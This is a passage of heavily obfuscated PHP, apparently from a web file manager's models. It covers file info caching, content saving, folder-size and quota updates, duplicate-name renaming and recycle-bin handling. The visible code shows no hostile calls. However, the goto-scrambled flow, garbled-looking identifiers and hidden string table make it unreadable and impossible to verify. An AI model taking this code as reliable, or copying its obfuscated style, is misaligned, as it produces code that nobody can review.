$this->fileInfoGet($Fèµ‡¯º¿À); if (!$AÊçáïĞêÅ) { return !1; } goto aÀÂÃÀÔ„ß; EŞ°¼äæÀ: } public function setDesc($C¨”ÑÏßØ, $cØ˜ä”³İ) { $f®˜µç¥ö¼ =& $_SERVER[Õİõş]; Model($f®˜µç¥ö¼[500])->eventAddDesc($C¨”ÑÏßØ, $cØ˜ä”³İ); return $this->metaSet($C¨”ÑÏßØ, $f®˜µç¥ö¼[400], $cØ˜ä”³İ); } public function setContent($B¦Í¦ˆàÕ, $d¾åµŸÉÙ = '') { goto d«ãÄ­ã¼™; d«ãÄ­ã¼™: $FğÏ´‰×“ =& $_SERVER[Õİõş]; $b²­ùİ÷ÄË = $this->sourceInfo($B¦Í¦ˆàÕ); $E”Ê©£µŒ¨ = $this->fileInfoGet($B¦Í¦ˆàÕ); goto eòõÖ÷êÓ; føö“Ëéã: if (!$CØöÁšØ¹×) { return Model($FğÏ´‰×“[417])->remove($e™ËÀÁÔ§[$FğÏ´‰×“[414]]); } $this->folderSizeReset($b²­ùİ÷ÄË[$FğÏ´‰×“[456]]); return !0; goto b§ÊğÃÉÚ‹; eòõÖ÷êÓ: if (!$E”Ê©£µŒ¨ || !$b²­ùİ÷ÄË) { return !1; } $e™ËÀÁÔ§ = Model($FğÏ´‰×“[417])->addFileByContent($d¾åµŸÉÙ, $b²­ùİ÷ÄË[$FğÏ´‰×“[28]]); $CØöÁšØ¹× = $this->fileHistory($b²­ùİ÷ÄË, $e™ËÀÁÔ§[$FğÏ´‰×“[414]], $e™ËÀÁÔ§[$FğÏ´‰×“[77]]); goto føö“Ëéã; b§ÊğÃÉÚ‹: } public function fileSubstr($b…Òİ×½Ï, $cãÄ½øÑÒ, $E†¬Èƒ÷ †) { $A½“‡‰×¦ = $this->fileInfoGet($b…Òİ×½Ï); if (!$A½“‡‰×¦) { return !1; } return IO::fileSubstr($A½“‡‰×¦[$_SERVER[Õİõş][75]], $cãÄ½øÑÒ, $E†¬Èƒ÷ †); } public function fileInfoGet($Eª³¨·õƒƒ) { goto b©öí¶ñí; dè®©ëô½: return $B‚ÜÆ’£Ã£; goto e±êóìëÆ; CÃîÆä«È: $B‚ÜÆ’£Ã£ = Model($FÔ¨á¼ò[417])->fileInfo($B¯–˜Ş™÷[$FÔ¨á¼ò[414]]); if ($B‚ÜÆ’£Ã£) { $B‚ÜÆ’£Ã£[$FÔ¨á¼ò[28]] = $B¯–˜Ş™÷[$FÔ¨á¼ò[28]]; } self::$cacheFileInfo[$eï·Ò¨œ¥§] = $B‚ÜÆ’£Ã£; goto dè®©ëô½; b©öí¶ñí: $FÔ¨á¼ò =& $_SERVER[Õİõş]; $B¯–˜Ş™÷ = $this->sourceInfo($Eª³¨·õƒƒ); if (!$B¯–˜Ş™÷ || $B¯–˜Ş™÷[$FÔ¨á¼ò[366]]) { return !1; } goto d‰±¼ØªË; d‰±¼ØªË: $eï·Ò¨œ¥§ = $FÔ¨á¼ò[420] . $B¯–˜Ş™÷[$FÔ¨á¼ò[414]]; $Dç¯éâ½ = _get(self::$cacheFileInfo, $eï·Ò¨œ¥§); if ($Dç¯éâ½) { return $Dç¯éâ½; } goto CÃîÆä«È; e±êóìëÆ: } private function folderChildrenNumber($aâ«¼¸ğ×‡) { $Bé³¨’·–Ø =& $_SERVER[Õİõş]; $CÛÄõ¸’ = $this->sourceInfo($aâ«¼¸ğ×‡); $a©»é‹ø˜Ø = array($Bé³¨’·–Ø[520] => array($Bé³¨’·–Ø[478], $CÛÄõ¸’[$Bé³¨’·–Ø[454]] . $aâ«¼¸ğ×‡ . $Bé³¨’·–Ø[479]), $Bé³¨’·–Ø[391] => intval($CÛÄõ¸’[$Bé³¨’·–Ø[392]]), $Bé³¨’·–Ø[513] => 1); $c×ÂÀ±Œ»¦ = $this->where($a©»é‹ø˜Ø)->count(); $a«à”½ĞŸ¢ = $this->where($a©»é‹ø˜Ø)->where(array($Bé³¨’·–Ø[513] => 0))->count(); return array($Bé³¨’·–Ø[81] => $a«à”½ĞŸ¢, $Bé³¨’·–Ø[82] => $c×ÂÀ±Œ»¦); } public function pathInfo($AÛš¸µ«”ô, $AŸö‡”…„ = false) { goto e…ö¢æôò; e…ö¢æôò: $Dˆ»—ÕÎ =& $_SERVER[Õİõş]; $b‘›ÍÄÇ‘ì = $Dˆ»—ÕÎ[406] . intval($AŸö‡”…„) . $Dˆ»—ÕÎ[407] . $AÛš¸µ«”ô; $fäÆ¤èÔÙè = _get(self::$cachePathInfo, $b‘›ÍÄÇ‘ì); goto aœ·šß¡©¤; a’¶îŞ¾î£: $e¹¤²Î°â¦ = $this->_listDataApplyItem($e¹¤²Î°â¦, $AŸö‡”…„); self::$cachePathInfo[$b‘›ÍÄÇ‘ì] = $e¹¤²Î°â¦; return $e¹¤²Î°â¦; goto e¤°¯‘³Â©; aœ·šß¡©¤: if ($fäÆ¤èÔÙè) { return $fäÆ¤èÔÙè; } $e¹¤²Î°â¦ = $this->sourceInfo($AÛš¸µ«”ô); if (!$e¹¤²Î°â¦) { return !1; } goto a’¶îŞ¾î£; e¤°¯‘³Â©: } public static $cachePathInfoMore = array(); public function pathInfoMore($bãåäĞˆ“) { goto bŞÄØ²¢«„; DØĞèã¤Øö: $C÷×±Úï©š = $this->pathInfo($bãåäĞˆ“); if (!$C÷×±Úï©š) { return !1; } if ($C÷×±Úï©š[$cÓøö¼ÉŠ—[366]] == $cÓøö¼ÉŠ—[83]) { $C÷×±Úï©š[$cÓøö¼ÉŠ—[80]] = $this->folderChildrenNumber($bãåäĞˆ“); } goto c¢ç‘ä¦‚¦; c¢ç‘ä¦‚¦: self::$cachePathInfoMore[$bãåäĞˆ“] = $C÷×±Úï©š; return $C÷×±Úï©š; goto BàÜÀ´ÈÑ; bŞÄØ²¢«„: $cÓøö¼ÉŠ— =& $_SERVER[Õİõş]; $C Àôâñ¥‹ = _get(self::$cachePathInfoMore, $bãåäĞˆ“); if ($C Àôâñ¥‹) { return $C Àôâñ¥‹; } goto DØĞèã¤Øö; BàÜÀ´ÈÑ: } public function sourceInfo($AÎ¶—Å¨ñ) { goto E”á¥‘íğÀ; E”á¥‘íğÀ: $FÉÇ‹…¨Ç =& $_SERVER[Õİõş]; if (!$AÎ¶—Å¨ñ) { return array(); } $e‰¨ŒßÎø° = $FÉÇ‹…¨Ç[405] . $AÎ¶—Å¨ñ; goto DŸÒœ´ŸÅ; eÄŒ¤­É˜Ò: self::$cacheSourceInfo[$e‰¨ŒßÎø°] = $Dé›è‚†›Á; return self::$cacheSourceInfo[$e‰¨ŒßÎø°]; goto DŸìŞ½´×¥; DŸÒœ´ŸÅ: $Aæï»÷·¨ = _get(self::$cacheSourceInfo, $e‰¨ŒßÎø°); if ($Aæï»÷·¨) { return $Aæï»÷·¨; } $Dé›è‚†›Á = $this->where(array($FÉÇ‹…¨Ç[365] => $AÎ¶—Å¨ñ))->find(); goto eÄŒ¤­É˜Ò; DŸìŞ½´×¥: } public function sourceCacheClear($cšª¸‘óß = false) { if ($cšª¸‘óß == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Õİõş][405] . $cšª¸‘óß]); } public function pathInfoByPath($Cã¸ÆÂç®í, $F‚Ïµƒ¡™Ü) { $CÎ¶˜ÕäÆË =& $_SERVER[Õİõş]; $B£•ì¬ìÇ¾ = !$F‚Ïµƒ¡™Ü ? array() : explode($CÎ¶˜ÕäÆË[8], trim($F‚Ïµƒ¡™Ü, $CÎ¶˜ÕäÆË[8])); $bÉ‰ÑÖ÷ì² = $Cã¸ÆÂç®í; foreach ($B£•ì¬ìÇ¾ as $EËï¦õ È£) { $e‚ƒ„àŸ¿¢ = array($CÎ¶˜ÕäÆË[456] => $bÉ‰ÑÖ÷ì², $CÎ¶˜ÕäÆË[28] => $EËï¦õ È£); $Câ …„Ã¶ = $this->where($e‚ƒ„àŸ¿¢)->select(); if (!$Câ …„Ã¶) { return !1; } $Câ …„Ã¶ = array_sort_by($Câ …„Ã¶, $CÎ¶˜ÕäÆË[392]); $bÉ‰ÑÖ÷ì² = $Câ …„Ã¶[0][$CÎ¶˜ÕäÆË[365]]; } return $this->pathInfo($bÉ‰ÑÖ÷ì², !0); } protected function updateModifyTime($F„ŸğÚñ‡â) { goto Fœ§ÜŠâ´; Fœ§ÜŠâ´: $B“ãáÄáø =& $_SERVER[Õİõş]; if (!$F„ŸğÚñ‡â) { return; } if (!is_array($F„ŸğÚñ‡â)) { $F„ŸğÚñ‡â = array($F„ŸğÚñ‡â); } goto EèäÑÓ½ÆÑ; CÄ•»éÍÔÓ: $this->where($f°ÖæĞ‡½¦)->save($B‘ ¨ˆŞÒÄ); goto FÉø„×ÜÎ‰; EèäÑÓ½ÆÑ: foreach ($F„ŸğÚñ‡â as $Fàâó“· => $DÃÎÖ°ˆÕ) { $F„ŸğÚñ‡â[$Fàâó“·] = intval($DÃÎÖ°ˆÕ); } $f°ÖæĞ‡½¦ = array($B“ãáÄáø[365] => array($B“ãáÄáø[7], $F„ŸğÚñ‡â)); $B‘ ¨ˆŞÒÄ = array($B“ãáÄáø[519] => USER_ID, $B“ãáÄáø[386] => time()); goto CÄ•»éÍÔÓ; FÉø„×ÜÎ‰: } public function folderSizeReset($B£‡¡ÀÅ·) { goto d‰›»§ŒÓÛ; f—°‹‡§: $E¶ø«ÖÕ = array($då¿İ³Æ„Î[364] => $B£‡¡ÀÅ·, $då¿İ³Æ„Î[391] => 0); $aÎï¥ñÃ¯¨ = $this->where($E¶ø«ÖÕ)->sum($då¿İ³Æ„Î[77]); $aÎï¥ñÃ¯¨ = intval($aÎï¥ñÃ¯¨); goto b ˆè’…¯; d‰›»§ŒÓÛ: $då¿İ³Æ„Î =& $_SERVER[Õİõş]; if ($this->statusIgnoreResetSpace) { return; } $Bæ¯Îà‚éŒ = $då¿İ³Æ„Î[2322] . $B£‡¡ÀÅ·; goto Døãç©·ìŠ; aÛùŒ‰¤çù: CacheLock::unlock($Bæ¯Îà‚éŒ); goto f—²½¬ù¬æ; Døãç©·ìŠ: CacheLock::lock($Bæ¯Îà‚éŒ, 20); $this->sourceCacheClear($B£‡¡ÀÅ·); $b½×¬İ¢ÁÚ = $this->sourceInfo($B£‡¡ÀÅ·); goto f—°‹‡§; B•¬Ì©ƒ©: $Cè‚ù½¡“ = $this->parentLevelArray($b½×¬İ¢ÁÚ[$då¿İ³Æ„Î[454]]); if ($Cè‚ù½¡“) { $E¶ø«ÖÕ = array($då¿İ³Æ„Î[365] => array($då¿İ³Æ„Î[380], $Cè‚ù½¡“)); if ($b©‡­ïºº < 0) { $E¶ø«ÖÕ[$då¿İ³Æ„Î[77]] = array($då¿İ³Æ„Î[933], abs($b©‡­ïºº)); } $this->where($E¶ø«ÖÕ)->setAdd($då¿İ³Æ„Î[77], $b©‡­ïºº); } $this->targetSpaceUpdate($b½×¬İ¢ÁÚ[$då¿İ³Æ„Î[367]], $b½×¬İ¢ÁÚ[$då¿İ³Æ„Î[451]]); goto aÛùŒ‰¤çù; b ˆè’…¯: $b©‡­ïºº = $aÎï¥ñÃ¯¨ - intval($b½×¬İ¢ÁÚ[$då¿İ³Æ„Î[77]]); if ($b©‡­ïºº == 0) { return CacheLock::unlock($Bæ¯Îà‚éŒ); } $this->where(array($då¿İ³Æ„Î[379] => $B£‡¡ÀÅ·))->setField($då¿İ³Æ„Î[77], $aÎï¥ñÃ¯¨); goto B•¬Ì©ƒ©; f—²½¬ù¬æ: } public function folderSizeResetChildren($e¼šïçíìÌ) { goto d»éàèŸĞ; d»éàèŸĞ: $d’¸ŸÁ…åå =& $_SERVER[Õİõş]; $this->sourceCacheClear($e¼šïçíìÌ); $A»Ğ‹Ãäòæ = $this->sourceInfo($e¼šïçíìÌ); goto Eä‡•©‚Í°; Eä‡•©‚Í°: $E’ƒè¤ÆÍö = array($d’¸ŸÁ…åå[513] => 1, $d’¸ŸÁ…åå[520] => array($d’¸ŸÁ…åå[478], $A»Ğ‹Ãäòæ[$d’¸ŸÁ…åå[454]] . $e¼šïçíìÌ . $d’¸ŸÁ…åå[479])); $a¾ô§Ì§“µ = $d’¸ŸÁ…åå[2323]; $cêšÛ¸ƒŞß = $this->field($a¾ô§Ì§“µ)->where($E’ƒè¤ÆÍö)->select(); goto b÷ÈŒ³‰Ç; b÷ÈŒ³‰Ç: $E’ƒè¤ÆÍö[$d’¸ŸÁ…åå[366]] = 0; $A›…¢ƒ¿ = $this->field($a¾ô§Ì§“µ)->where($E’ƒè¤ÆÍö)->select(); if (!$A›…¢ƒ¿) { return; } goto d—õ£š‹; aˆ”à„‡ôÙ: foreach ($A›…¢ƒ¿ as $CÁ›’­æÉ³) { $AÊÄ«õ‘Á… = $CÁ›’­æÉ³[$d’¸ŸÁ…åå[456]] . $d’¸ŸÁ…åå[33]; if (!isset($cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…])) { continue; } if ($CÁ›’­æÉ³[$d’¸ŸÁ…åå[392]] == $cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…][$d’¸ŸÁ…åå[392]]) { $cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…][$d’¸ŸÁ…åå[77]] += $CÁ›’­æÉ³[$d’¸ŸÁ…åå[77]]; } } foreach ($cêšÛ¸ƒŞß as $CÁ›’­æÉ³) { $f¢‹Ü’àëˆ = $this->parentLevelArray($CÁ›’­æÉ³[$d’¸ŸÁ…åå[454]]); foreach ($f¢‹Ü’àëˆ as $AÊÄ«õ‘Á…) { $AÊÄ«õ‘Á… = $AÊÄ«õ‘Á… . $d’¸ŸÁ…åå[33]; if (!isset($cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…])) { continue; } if ($CÁ›’­æÉ³[$d’¸ŸÁ…åå[392]] == $cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…][$d’¸ŸÁ…åå[392]]) { $cêšÛ¸ƒŞß[$AÊÄ«õ‘Á…][$d’¸ŸÁ…åå[77]] += $CÁ›’­æÉ³[$d’¸ŸÁ…åå[77]]; } } } $E˜§×³­¹Ú = array(); goto f‚Ì²¯Ç¬; d—õ£š‹: $cêšÛ¸ƒŞß[] = $A»Ğ‹Ãäòæ; $cêšÛ¸ƒŞß = array_to_keyvalue($cêšÛ¸ƒŞß, $d’¸ŸÁ…åå[365]); foreach ($cêšÛ¸ƒŞß as $Eê¶¶¢­Îƒ => $CÁ›’­æÉ³) { $cêšÛ¸ƒŞß[$Eê¶¶¢­Îƒ][$d’¸ŸÁ…åå[2324]] = $cêšÛ¸ƒŞß[$Eê¶¶¢­Îƒ][$d’¸ŸÁ…åå[77]]; $cêšÛ¸ƒŞß[$Eê¶¶¢­Îƒ][$d’¸ŸÁ…åå[77]] = 0; } goto aˆ”à„‡ôÙ; f‚Ì²¯Ç¬: foreach ($cêšÛ¸ƒŞß as $CÁ›’­æÉ³) { if ($CÁ›’­æÉ³[$d’¸ŸÁ…åå[77]] == $CÁ›’­æÉ³[$d’¸ŸÁ…åå[2324]]) { continue; } $E˜§×³­¹Ú[] = array($d’¸ŸÁ…åå[365], $CÁ›’­æÉ³[$d’¸ŸÁ…åå[365]], $d’¸ŸÁ…åå[77], $CÁ›’­æÉ³[$d’¸ŸÁ…åå[77]]); } $this->saveAll($E˜§×³­¹Ú); goto eßÎ¢©•ß¶; eßÎ¢©•ß¶: } public function userSpaceReset($fªœÍœ¯‘É = false) { $e¿Î»ñ²Š =& $_SERVER[Õİõş]; $f•éƒÚÀ­Í = $this->where(array($e¿Î»ñ²Š[367] => self::TYPE_USER, $e¿Î»ñ²Š[451] => $fªœÍœ¯‘É, $e¿Î»ñ²Š[366] => 0))->sum($e¿Î»ñ²Š[77]); Model($e¿Î»ñ²Š[469])->userEdit($fªœÍœ¯‘É, array($e¿Î»ñ²Š[2066] => $f•éƒÚÀ­Í)); } public function targetSpaceUpdate($e¡‚ğŞÉĞ£, $CÁµ·“ÆíÚ) { $D§¯Şòèˆ =& $_SERVER[Õİõş]; if (!$CÁµ·“ÆíÚ) { return; } if (!in_array($e¡‚ğŞÉĞ£, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $C‡à¯ãÓ¦× = $this->targetSpaceSize($e¡‚ğŞÉĞ£, $CÁµ·“ÆíÚ); if ($e¡‚ğŞÉĞ£ == self::TYPE_USER) { Model($D§¯Şòèˆ[469])->userEdit($CÁµ·“ÆíÚ, array($D§¯Şòèˆ[2066] => $C‡à¯ãÓ¦×)); } else { if ($e¡‚ğŞÉĞ£ == self::TYPE_GROUP) { Model($D§¯Şòèˆ[453])->groupEdit($CÁµ·“ÆíÚ, array($D§¯Şòèˆ[2066] => $C‡à¯ãÓ¦×)); } } } public function targetSpaceSize($cøßŞËÔ…œ, $eÈæÎ†ÚÆ„) { goto B¢Å„”È˜œ; Eö–·‰êôÍ: return $b”ŠŠä¨œ; goto F¹¸µÖ‰ñé; B¢Å„”È˜œ: $D¬çÈÒ«²Ï =& $_SERVER[Õİõş]; $C—¼†á‹ğ = $this->sourceRoot($cøßŞËÔ…œ, $eÈæÎ†ÚÆ„, !0); if (!$C—¼†á‹ğ) { return 0; } goto CÉ‡Ç›¦º; CÉ‡Ç›¦º: $b”ŠŠä¨œ = floatval($C—¼†á‹ğ[$D¬çÈÒ«²Ï[77]]); $C¹Ìñ×È¢¿ = array($D¬çÈÒ«²Ï[520] => array($D¬çÈÒ«²Ï[478], $D¬çÈÒ«²Ï[465] . $C—¼†á‹ğ[$D¬çÈÒ«²Ï[365]] . $D¬çÈÒ«²Ï[479])); $f›Š÷™³ = Model($D¬çÈÒ«²Ï[390])->field($D¬çÈÒ«²Ï[379])->where($C¹Ìñ×È¢¿)->select(); goto f—İ‚«Åº; f—İ‚«Åº: $f›Š÷™³ = array_to_keyvalue($f›Š÷™³, $D¬çÈÒ«²Ï[33], $D¬çÈÒ«²Ï[365]); $f›Š÷™³ = array_unique(array_filter($f›Š÷™³)); if ($f›Š÷™³) { $C¹Ìñ×È¢¿ = array($D¬çÈÒ«²Ï[379] => array($D¬çÈÒ«²Ï[380], $f›Š÷™³)); $b”ŠŠä¨œ += floatval($this->where($C¹Ìñ×È¢¿)->sum($D¬çÈÒ«²Ï[77])); } goto Eö–·‰êôÍ; F¹¸µÖ‰ñé: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($A¬Áô‡Ç½) { return $this->fileTypeProfile($A¬Áô‡Ç½, SourceModel::TYPE_USER); } public function groupFileTypeProfile($EÓƒ…‡½İ) { return $this->fileTypeProfile($EÓƒ…‡½İ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aãƒË°ùŞç, $EÑ¥øÈ Ç¶) { goto f•‡¼¦¦¬Ñ; bÑ§Î•Ôå: foreach ($f¤³áÁÈÒÇ as $e¤½¬ïÄ±µ => $Bì„Éíê) { $däŒò»çìö[$c±è§ö¬Ô¢[368]] = $this->fileTypeWhere($e¤½¬ïÄ±µ); $d•Åë•Ê„[$e¤½¬ïÄ±µ] = array($c±è§ö¬Ô¢[2327] => $Bì„Éíê[$c±è§ö¬Ô¢[28]], $c±è§ö¬Ô¢[2328] => $this->where($däŒò»çìö)->count(), $c±è§ö¬Ô¢[515] => $this->where($däŒò»çìö)->sum($c±è§ö¬Ô¢[77])); } Cache::set($D»Ã‚È·ˆ™, $d•Åë•Ê„, 1200); return $d•Åë•Ê„; goto d½øÎ°ÚÄ; f•‡¼¦¦¬Ñ: $c±è§ö¬Ô¢ =& $_SERVER[Õİõş]; $D»Ã‚È·ˆ™ = $c±è§ö¬Ô¢[2325] . $aãƒË°ùŞç . $c±è§ö¬Ô¢[70] . $EÑ¥øÈ Ç¶; $D×ë¦™¾Î = Cache::get($D»Ã‚È·ˆ™); goto EğÍõæ¤; BÖÖ»ÌÑñ¢: $d•Åë•Ê„ = array(); $d•Åë•Ê„[$c±è§ö¬Ô¢[2326]] = array($c±è§ö¬Ô¢[2327] => LNG($c±è§ö¬Ô¢[2326]), $c±è§ö¬Ô¢[2328] => $this->where($däŒò»çìö)->count(), $c±è§ö¬Ô¢[515] => $this->where($däŒò»çìö)->sum($c±è§ö¬Ô¢[77])); $f¤³áÁÈÒÇ = KodIO::fileTypeList(); goto bÑ§Î•Ôå; EğÍõæ¤: if ($D×ë¦™¾Î) { return $D×ë¦™¾Î; } $däŒò»çìö = array($c±è§ö¬Ô¢[513] => 0); if ($aãƒË°ùŞç != !1) { $däŒò»çìö[$c±è§ö¬Ô¢[451]] = $aãƒË°ùŞç; $däŒò»çìö[$c±è§ö¬Ô¢[367]] = $EÑ¥øÈ Ç¶; } goto BÖÖ»ÌÑñ¢; d½øÎ°ÚÄ: } public function fileNameExist($Bö½‹òÌôÃ, $Dºùô­ò†é) { $Bî ˆ ‰…Î =& $_SERVER[Õİõş]; $càÌ¤“ª™ = $this->childList($Bö½‹òÌôÃ); foreach ($càÌ¤“ª™ as $F»ÑêÅÌÜ‘) { if ($F»ÑêÅÌÜ‘[$Bî ˆ ‰…Î[28]] == $Dºùô­ò†é) { return $F»ÑêÅÌÜ‘[$Bî ˆ ‰…Î[365]]; } } return !1; } public function childList($aùĞµÂ‡¼œ) { goto bŞÅ„ñïàÈ; bŞÅ„ñïàÈ: $bæ¯·„Î’ğ =& $_SERVER[Õİõş]; $FÑÁÂ„ƒ¬„ = $bæ¯·„Î’ğ[2306] . $aùĞµÂ‡¼œ; if (isset(self::$cacheChildList[$FÑÁÂ„ƒ¬„])) { return self::$cacheChildList[$FÑÁÂ„ƒ¬„]; } goto aéøÍšóÓ; aéøÍšóÓ: $F‰­ÌÍãˆ = array($bæ¯·„Î’ğ[456] => intval($aùĞµÂ‡¼œ), $bæ¯·„Î’ğ[392] => 0); $A‰¹òèÒ = $this->where($F‰­ÌÍãˆ)->select(); $A‰¹òèÒ = $A‰¹òèÒ ? $A‰¹òèÒ : array(); goto e½à…¡ÔĞÑ; e½à…¡ÔĞÑ: self::$cacheChildList[$FÑÁÂ„ƒ¬„] = $A‰¹òèÒ; foreach ($A‰¹òèÒ as $EÌò‚ÛëÈ) { $FÑÁÂ„ƒ¬„ = $bæ¯·„Î’ğ[405] . $EÌò‚ÛëÈ[$bæ¯·„Î’ğ[365]]; self::$cacheSourceInfo[$FÑÁÂ„ƒ¬„] = $EÌò‚ÛëÈ; } return $A‰¹òèÒ; goto e•¢Ÿİ‚¼; e•¢Ÿİ‚¼: } public function fileNameAuto($C†ŸÌÛíÖ¸, $F…ëÊ‘‘„®, $E—ğˆ¾ºäß = REPEAT_RENAME, $AŠöº˜·Ó« = false) { $D¥ñ•‡Á˜ä =& $_SERVER[Õİõş]; $CÍ¬ÃáÕªÖ = $this->childList($C†ŸÌÛíÖ¸); $fíÒ¡æ‰“‰ = array_to_keyvalue($CÍ¬ÃáÕªÖ, $D¥ñ•‡Á˜ä[33], $D¥ñ•‡Á˜ä[28]); return $this->fileNameAutoGet($fíÒ¡æ‰“‰, $F…ëÊ‘‘„®, $E—ğˆ¾ºäß, $AŠöº˜·Ó«); } public function fileNameAutoGet($C‹ Â÷ä…á, $aøÊŠ£…ßƒ, $D«¤ˆéÁÕ, $CÖğÉƒ¸…Ã) { $A¾éÜØ‹ê =& $_SERVER[Õİõş]; if ($D«¤ˆéÁÕ == REPEAT_REPLACE || !$C‹ Â÷ä…á || !in_array_not_case($aøÊŠ£…ßƒ, $C‹ Â÷ä…á) || $CÖğÉƒ¸…Ã && $D«¤ˆéÁÕ != REPEAT_RENAME_FOLDER) { return $aøÊŠ£…ßƒ; } if ($D«¤ˆéÁÕ == REPEAT_SKIP) { return !1; } $dÆ¨Ù›á˜• = $A¾éÜØ‹ê[91] . get_path_ext($aøÊŠ£…ßƒ); $dÆ¨Ù›á˜• = $dÆ¨Ù›á˜• == $A¾éÜØ‹ê[91] || $CÖğÉƒ¸…Ã ? $A¾éÜØ‹ê[33] : $dÆ¨Ù›á˜•; for ($E„ŠóĞ”¥ = 1; $E„ŠóĞ”¥ <= count($C‹ Â÷ä…á) + 1; $E„ŠóĞ”¥++) { $AÕ„°›ÇŒÃ = substr($aøÊŠ£…ßƒ, 0, strlen($aøÊŠ£…ßƒ) - strlen($dÆ¨Ù›á˜•)); $AÕÛÁÓî·¡ = $AÕ„°›ÇŒÃ . "\x28{$E„ŠóĞ”¥}\51{$dÆ¨Ù›á˜•}"; if (!in_array_not_case($AÕÛÁÓî·¡, $C‹ Â÷ä…á)) { return $AÕÛÁÓî·¡; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\x63\x65\x5f\162\145\143\171\143\154\145"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\x54\x69\155\x65", "\164\151\155\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\x6e\143\164\x69\157\x6e")); public function listData($d‹×¾Áêì‰ = false) { $Bä°˜§ß¥ =& $_SERVER[Õİõş]; $d‹×¾Áêì‰ = $d‹×¾Áêì‰ ? $d‹×¾Áêì‰ : USER_ID; $aÔÓ‰±ã­ = $this->where(array($Bä°˜§ß¥[1408] => $d‹×¾Áêì‰))->select(); return array_to_keyvalue($aÔÓ‰±ã­, $Bä°˜§ß¥[33], $Bä°˜§ß¥[365]); } public function moveToRecycle($aˆË¶ì¹ã) { goto Cµù“çÄ›; bÁ‹ÙêÂÖ™: $this->recycleMove($aˆË¶ì¹ã, 1); if ($E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[366]] == $Fõ­ ‚öŒÇ[83]) { $DÄ¡Š…ó–æ = array($Fõ­ ‚öŒÇ[520] => array($Fõ­ ‚öŒÇ[478], $E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[454]] . $aˆË¶ì¹ã . $Fõ­ ‚öŒÇ[479])); $BìÚÄÄÔâè->where($DÄ¡Š…ó–æ)->setField($Fõ­ ‚öŒÇ[392], 1); } goto bíŞ‘ïÏÑ²; Cµù“çÄ›: $Fõ­ ‚öŒÇ =& $_SERVER[Õİõş]; $BìÚÄÄÔâè = Model($Fõ­ ‚öŒÇ[1113]); $E°ˆ’«Ã‘½ = $BìÚÄÄÔâè->sourceInfo($aˆË¶ì¹ã); goto aÏó’±°; aÏó’±°: if (!$E°ˆ’«Ã‘½ || $E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[392]] == $Fõ­ ‚öŒÇ[83]) { return; } $BŠ¾ïø”›” = array($Fõ­ ‚öŒÇ[379] => $aˆË¶ì¹ã, $Fõ­ ‚öŒÇ[1408] => USER_ID, $Fõ­ ‚öŒÇ[516] => $E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[367]], $Fõ­ ‚öŒÇ[517] => $E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[451]], $Fõ­ ‚öŒÇ[520] => $E°ˆ’«Ã‘½[$Fõ­ ‚öŒÇ[454]]); $this->add($BŠ¾ïø”›”); goto bÁ‹ÙêÂÖ™; bíŞ‘ïÏÑ²: } public function clear() { $this->remove(!1); } public function remove($eÜ›ÍÌ±ïß = false) { goto EêÙÉÖõñ·; EêÙÉÖõñ·: $Cğ›„ºÆØÉ =& $_SERVER[Õİõş]; $C‹ØƒßõÜÈ = Model($Cğ›„ºÆØÉ[1113]); $fÈ¼§ğÒÈÀ = $this->listData(); goto AÛ†ê½„Ğ; AÛ†ê½„Ğ: $eÜ›ÍÌ±ïß = $eÜ›ÍÌ±ïß === !1 ? !1 : $eÜ›ÍÌ±ïß; $F±³¥«™Â¥ = array(); foreach ($fÈ¼§ğÒÈÀ as $CŠ®‚Æ™•¿) { if ($eÜ›ÍÌ±ïß != !1 && !in_array($CŠ®‚Æ™•¿, $eÜ›ÍÌ±ïß)) { continue; } $C‹ØƒßõÜÈ->remove($CŠ®‚Æ™•¿, !1); $B‘¾Í´‘¨÷ = $this->where(array($Cğ›„ºÆØÉ[365] => $CŠ®‚Æ™•¿))->find(); $fšòõ§²ö§ = $B‘¾Í´‘¨÷[$Cğ›„ºÆØÉ[367]] . $Cğ›„ºÆØÉ[70] . $B‘¾Í´‘¨÷[$Cğ›„ºÆØÉ[451]]; $F±³¥«™Â¥[$fšòõ§²ö§] = array($Cğ›„ºÆØÉ[516] => $B‘¾Í´‘¨÷[$Cğ›„ºÆØÉ[367]], $Cğ›„ºÆØÉ[451] => $B‘¾Í´‘¨÷[$Cğ›„ºÆØÉ[451]]); $this->where(array($Cğ›„ºÆØÉ[365] => $CŠ®‚Æ™•¿))->delete(); } goto B¨·†ÈªÑ; B¨·†ÈªÑ: foreach ($F±³¥«™Â¥ as $dÕ°à‹»È) { $C‹ØƒßõÜÈ->targetSpaceUpdate($dÕ°à‹»È[$Cğ›„ºÆØÉ[367]], $dÕ°à‹»È[$Cğ›„ºÆØÉ[451]]); } goto BƒÚ‰êÙ‡‡; BƒÚ‰êÙ‡‡: } public function restore($AÑº¶Û£—’ = false) { goto CÕ†Ë‰ïí³; CÕ†Ë‰ïí³: $B´ù¹²÷ =& $_SERVER[Õİõş]; $f„„™±—“‹ = Model($B´ù¹²÷[1113]); $e¡½Ñ‚Ôğø = $this->listData(); goto fÚ½ß­©åÑ; FÖÚîÍöŸ: foreach ($e¡½Ñ‚Ôğø as $BÇÄ„îĞìÍ) { goto C­ŠñÒ¹¥; C‚¥÷°œ£ñ: if ($B³çŸÁï˜[$B´ù¹²÷[392]] == $B´ù¹²÷[83]) { continue; } $f„„™±—“‹->lockMoveStart($BÇÄ„îĞìÍ); $this->recycleMove($BÇÄ„îĞìÍ, 0); goto Eë¤Ì‡Ú¤Â; Eë¤Ì‡Ú¤Â: if ($FØğ·‹ÌÏ´[$B´ù¹²÷[366]] == $B´ù¹²÷[83]) { 